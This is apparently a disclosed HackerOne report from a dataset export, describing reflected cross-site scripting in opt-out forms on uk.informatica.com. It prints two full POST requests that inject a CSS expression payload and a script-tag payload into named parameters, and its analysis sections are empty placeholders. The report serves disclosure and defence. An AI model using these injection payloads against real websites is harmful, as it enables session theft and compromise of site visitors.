---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '143323'
original_report_id: '143323'
title: '[uk.informatica.com] XSS on uk.informatica..com'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: informatica
created_at: '2016-06-06T14:55:54.892Z'
disclosed_at: '2017-02-28T04:15:38.590Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 10
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [uk.informatica.com] XSS on uk.informatica..com

## Metadata

- HackerOne Report ID: 143323
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: informatica
- Disclosed At: 2017-02-28T04:15:38.590Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

The following urls on uk.informatica.com:80 have XSS vulnerabilities, I have copied the POST header and data for both instances.

--------------------------------------------------------------------------------------------------------------------------------------------
http://uk.informatica.com:80/o/Default.asp (parameters found vulnerable PageLink, ResponseHandlingLanguage, UID), The below example shows the PageLink parameter being exploited with 
" style="width:expression(prompt(1));

POST /o/Default.asp HTTP/1.1
Content-Length: 779
Content-Type: application/x-www-form-urlencoded
Referer: http://uk.informatica.com:80/
Cookie: eu=; ASPSESSIONIDQCABSAAR=DMLJGLOADMFJNAEMPHCPLBMG; Lang=ResponseHandlingLanguage=British
Host: uk.informatica.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

OPTOUT=Submit&DMAILX=true&EMAIL=sample%40email.tst&EMAILX=true&EVENTS_DMAIL=TRUE&EVENTS_EMAIL=TRUE&EVENTS_PHONE=TRUE&NAME=&NEWSLETTERS_DMAIL=TRUE&NEWSLETTERS_EMAIL=TRUE&NEW_PRODUCT_DMAIL=TRUE&NEW_PRODUCT_EMAIL=TRUE&NEW_PRODUCT_PHONE=TRUE&OptOutForm=OptOutForm&PageLink=1" style="width:expression(prompt(1));&PHONEX=true&PRODUCT_UPDATE_DMAIL=TRUE&PRODUCT_UPDATE_EMAIL=TRUE&PRODUCT_UPDATE_PHONE=TRUE&PROMOTIONS_DMAIL=TRUE&PROMOTIONS_EMAIL=TRUE&PROMOTIONS_PHONE=TRUE&ResponseHandlingLanguage=British&SURNAME=&TITLE=&TRAINING_DMAIL=TRUE&TRAINING_EMAIL=TRUE&TRAINING_PHONE=TRUE&UID=&USERGROUPS_DMAIL=TRUE&USERGROUPS_EMAIL=TRUE&USERGROUPS_PHONE=TRUE&WEBINAR_DMAIL=TRUE&WEBINAR_EMAIL=TRUE&WEBINAR_PHONE=TRUE&WHITEPAPERS_DMAIL=TRUE&WHITEPAPERS_EMAIL=TRUE&WHITEPAPERS_PHONE=TRUE

--------------------------------------------------------------------------------------------------------------------------------------------

http://uk.informatica.com:80/r/Default.asp (parameters found vulnerable PageLink, ResponseHandlingLanguage, UID), The below example shows the UID parameter being exploited with "><script>prompt(1)</script> .

POST /r/Default.asp HTTP/1.1
Content-Length: 779
Content-Type: application/x-www-form-urlencoded
Referer: http://uk.informatica.com:80/
Cookie: eu=; ASPSESSIONIDQCABSAAR=DMLJGLOADMFJNAEMPHCPLBMG; Lang=ResponseHandlingLanguage=British
Host: uk.informatica.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

OPTOUT=Submit&DMAILX=true&EMAIL=sample%40email.tst&EMAILX=true&EVENTS_DMAIL=TRUE&EVENTS_EMAIL=TRUE&EVENTS_PHONE=TRUE&NAME=&NEWSLETTERS_DMAIL=TRUE&NEWSLETTERS_EMAIL=TRUE&NEW_PRODUCT_DMAIL=TRUE&NEW_PRODUCT_EMAIL=TRUE&NEW_PRODUCT_PHONE=TRUE&OptOutForm=OptOutForm&PageLink=1&PHONEX=true&PRODUCT_UPDATE_DMAIL=TRUE&PRODUCT_UPDATE_EMAIL=TRUE&PRODUCT_UPDATE_PHONE=TRUE&PROMOTIONS_DMAIL=TRUE&PROMOTIONS_EMAIL=TRUE&PROMOTIONS_PHONE=TRUE&ResponseHandlingLanguage=British&SURNAME=&TITLE=&TRAINING_DMAIL=TRUE&TRAINING_EMAIL=TRUE&TRAINING_PHONE=TRUE&UID="><script>prompt(1)</script>&USERGROUPS_DMAIL=TRUE&USERGROUPS_EMAIL=TRUE&USERGROUPS_PHONE=TRUE&WEBINAR_DMAIL=TRUE&WEBINAR_EMAIL=TRUE&WEBINAR_PHONE=TRUE&WHITEPAPERS_DMAIL=TRUE&WHITEPAPERS_EMAIL=TRUE&WHITEPAPERS_PHONE=TRUE

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
